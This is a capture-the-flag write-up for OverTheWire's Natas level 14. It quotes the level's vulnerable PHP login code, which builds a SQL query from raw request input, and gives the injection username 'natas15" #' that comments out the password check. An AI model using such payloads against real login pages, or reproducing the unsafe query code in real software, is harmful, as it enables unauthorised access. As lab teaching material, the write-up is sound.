# Natas Level 13 → Level 14

URL : http://natas14.natas.labs.overthewire.org

- In this level we are presented withing a login screen
- Let's read the source code to understand how it works
```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
```
- This code, connects to a sql database(`mysql_connect`), and performs a query, the query is:
```sql
SELECT * FROM users WHERE username = "" and password = ""
```
	- i.e it selects all the users from the database, with the given username and password
- now we have to manipulate the query such that we get the next level's password, now to do this we can use SQL comments `--` or `#`
- so we can try, 

	username : `natas15" #` 

	password : leave it blank
```sql
SELECT * FROM users WHERE username = "natas15" # and password = "" 
```
- so by giving this as username, the password check gets commented out (i.e doesn't verify for password)
- and by doing so, we can get the password for the next level!!